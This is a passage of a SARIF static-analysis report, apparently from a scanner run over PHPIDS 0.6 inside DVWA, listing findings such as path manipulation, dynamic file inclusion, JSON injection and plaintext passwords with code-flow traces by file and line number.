                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4414",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at Storage.php line 305, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "2087A89E0F738A71E88A615F2141A6DB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
          },
          "region" : {
            "startLine" : 305,
            "endLine" : 305,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:305 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 305
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - init^(1->config['General']['filter_path'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:189 - init^(0->config['General']['filter_path'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 189
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:100 - Assignment to $this->source"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 100
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:114 - getfilterfromjson(this->source)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 114
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:305 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 305
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:305 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 305
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - init^(1->config['General']['base_path'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:189 - init^(0->config['General']['base_path'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 189
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:100 - getbasepath(this->config['General']['base_path'] : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 100
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:100 - Assignment to $this->source"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 100
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:114 - getfilterfromjson(this->source)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 114
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:305 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 305
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4662",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C63F1BA052CC1BD4D4A924A795C5C960"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
          },
          "region" : {
            "startLine" : 92,
            "endLine" : 92,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:92 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
                },
                "region" : {
                  "startLine" : 92
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:92 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
                },
                "region" : {
                  "startLine" : 92
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4425",
      "message" : {
        "text" : "Null passwords can compromise security.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "263BE17B59FD6341C7AA28A045DDBF4D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
          },
          "region" : {
            "startLine" : 97,
            "endLine" : 97,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:97 - FieldAccess: password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
                },
                "region" : {
                  "startLine" : 97
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:97 - FieldAccess: password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
                },
                "region" : {
                  "startLine" : 97
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:97 - Field: password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
                },
                "region" : {
                  "startLine" : 97
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4420",
      "message" : {
        "text" : "On line 176 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "239337FDA6CFB24AF8F2A778685DC03E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
          },
          "region" : {
            "startLine" : 176,
            "endLine" : 176,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:176 - prepare()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
                },
                "region" : {
                  "startLine" : 176
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:176 - prepare()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Database.php"
                },
                "region" : {
                  "startLine" : 176
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4598",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "94930504767E06DA9330D1B230117BFB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Log/Email.php"
          },
          "region" : {
            "startLine" : 238,
            "endLine" : 238,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Email.php:238 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Email.php"
                },
                "region" : {
                  "startLine" : 238
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Email.php:238 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/Email.php"
                },
                "region" : {
                  "startLine" : 238
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4456",
      "message" : {
        "text" : "The program might reveal system data or debugging information in File.php with a call to fwrite() on line 196. The information revealed by fwrite() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "3E3996F60CE8355AEBE0A548232B5BC8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
          },
          "region" : {
            "startLine" : 196,
            "endLine" : 196,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "File.php:164 - Read $_SERVER"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 164
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:196 - fwrite(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 196
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:164 - Read $_SERVER"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 164
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:164 - sprintf(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 164
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:157 - Assignment to $dataString"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 157
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:166 - Return $dataString"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 166
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:185 - preparedata(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 185
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:185 - Assignment to $data"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 185
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:190 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 190
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:190 - Assignment to $data"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 190
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:196 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 196
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "File.php:196 - fwrite(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Log/File.php"
                },
                "region" : {
                  "startLine" : 196
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4620",
      "message" : {
        "text" : "The file Monitor.php passes an unvalidated filename to a dynamic include statement on line 368. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "A0D8E705A133B314D700D9C6D4B5E395"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 368,
            "endLine" : 368,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:368 - builtin_includeonce(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 368
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - init^(1->config['General']['HTML_Purifier_Path'] : this->pathToHTMLPurifier)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:126 - run(this->pathToHTMLPurifier)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 126
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(this->pathToHTMLPurifier)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(this->pathToHTMLPurifier)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:308 - _purifyvalues(this->pathToHTMLPurifier)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 308
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:368 - builtin_includeonce(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 368
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4381",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "0A7A09AA0F67B9D6C3D5833FD2C5C7C6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:63 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 63
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:63 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 63
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4385",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "119A062DEDA86244385F478DE71FE2F4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:44 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 44
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:44 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 44
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4449",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "38D997552638D2B3011C8133801D672D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:65 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:65 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
